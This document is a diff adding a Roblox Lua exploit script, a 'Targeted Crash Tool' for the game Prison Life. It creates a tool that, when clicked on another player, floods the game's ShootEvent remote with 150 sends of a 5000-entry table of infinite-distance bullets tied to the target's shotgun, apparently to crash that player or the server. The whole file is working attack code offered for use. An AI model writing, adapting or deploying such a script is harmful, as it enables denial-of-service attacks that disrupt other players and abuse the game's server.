@@ -1,0 +1,41 @@
+-- Targeted Crash Tool
+-- For Prison Life
+-- by BlocksWatcher11
+-- TONS of Help from Sparksammy
+local Players = game:GetService("Players")
+local RStorage = game:GetService("ReplicatedStorage")
+local SendCrash = RStorage:WaitForChild("ShootEvent")
+local packetamount = 5000
+local packetsend = 150
+local bulletlength = math.huge
+local Tool = "Remington 870"
+local toolLocal = Instance.new("Tool", game.Players.LocalPlayer.Backpack)
+toolLocal.Name = "yeet"
+toolLocal.ToolTip = "Yeetus that hacking fetus"
+
+function getCrashTool(targetHoldingRemington)
+local Player = Players:FindFirstChild(targetHoldingRemington)
+local Backpack = Player:FindFirstChild("Backpack")
+return Backpack:FindFirstChild(Tool)
+end
+
+function crash(targetHoldingRemington)
+local CrashTable = { }
+for i=1, packetamount do
+CrashTable[i] = {
+Cframe = CFrame.new(),
+Distance = bulletlength }
+end
+for i=1, packetsend do
+SendCrash:FireServer(CrashTable,getCrashTool(targetHoldingRemington))
+end
+end
+
+function activated()
+local mouse = game.Players.LocalPlayer:GetMouse()
+local playerName = mouse.Target.Parent.Name
+crash(playerName)
+end
+
+
+toolLocal.Activated:Connect(activated)
